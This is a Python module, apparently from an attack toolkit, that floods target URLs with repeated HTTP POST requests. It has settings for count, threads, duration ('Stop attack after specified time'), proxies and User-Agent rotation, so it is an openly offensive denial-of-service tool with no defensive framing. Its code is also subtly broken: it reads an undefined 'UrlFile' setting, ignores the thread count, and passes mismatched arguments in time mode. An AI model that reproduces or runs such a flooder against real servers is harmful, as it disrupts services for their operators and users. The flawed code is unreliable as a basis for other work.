import requests

from lib.cmd_tool import *

NAME = 'HttpPOST'

class Module:
    def __init__(self):
        self.config = {
            'URLs': {
                'value': '',
                'help': 'Target URLs.',
            },
            'Count': {
                'value': '100',
                'help': 'HTTP POST with specified count.',
            },
            'Thread': {
                'value': '20',
                'help': 'Thread count.',
            },
            'Timeout': {
                'value': '10',
                'help': 'HTTP request timeout(second).',
            },
            'Time': {
                'value': '10',
                'help': 'Stop attack after specified time.',
            },
            'DefaultUA': {
                'value': DEFAULT_UA,
                'help': 'Default User-Agent.',
            },
            'UAfile': {
                'value': '',
                'help': 'User-Agents file.',
            },
            'DefaultProxy': {
                'value': '',
                'help': '',
            },
            'ProxyFile': {
                'value': '',
                'help': '',
            },
            'Payload': {
                'value': 'hellohellohello',
                'help': 'HTTP POST data.',
            },
            'Mode': {
                'value': '',
                'help': '',
                'option': {
                    MODE_COUNT: '',
                    MODE_TIME: '',
                }
            },
        }

    def validate(self) -> bool:
        return True

    def interactive(self):
        interactive(self, 'http_post')

    def get_lsURL(self) -> list:
        szURLs = get_value(self.config, 'URLs')
        szUrlFile = get_value(self.config, 'UrlFile')

        if szUrlFile:
            with open(szUrlFile, 'r') as f:
                return f.readlines()
        
        else:
            return str2strls(szURLs)
        
    def get_szUA(self) -> str:

        return ''

    def run(self):
        def req_post(szUrl: str, szPayload: str, szUA: str, nTimeout: int):
            headers = {
                'User-Agent': szUA,
            }

            requests.post(szUrl, headers=headers, data=szPayload, timeout=nTimeout)

        try:
            lsURL = self.get_lsURL()
            nCount = int(get_value(self.config, 'Count'))
            szUA = self.get_szUA()
            szPayload = get_value(self.config, 'Payload')
            nTime = int(get_value(self.config, 'Time'))
            nTimeout = int(get_value(self.config, 'Timeout'))
            nThread = int(get_value(self.config, 'Thread'))
            nMode = int(get_value(self.config, 'Mode'))

            total = 0

            for url in lsURL:
                if nMode == MODE_COUNT:
                    for _ in range(0, nCount):
                        req_post(url, szPayload, szUA, nTimeout)
                        total += 1
                
                elif nMode == MODE_TIME:
                    total = doWorkWithSeconds(req_post, nTime, {'szUrl': url, 'szPayload': szPayload, 'nTimeout': nTime})
            
            cp.pf_ok(f'Sent request: {total}')

        except Exception as ex:
            cp.pf_failed(str(ex))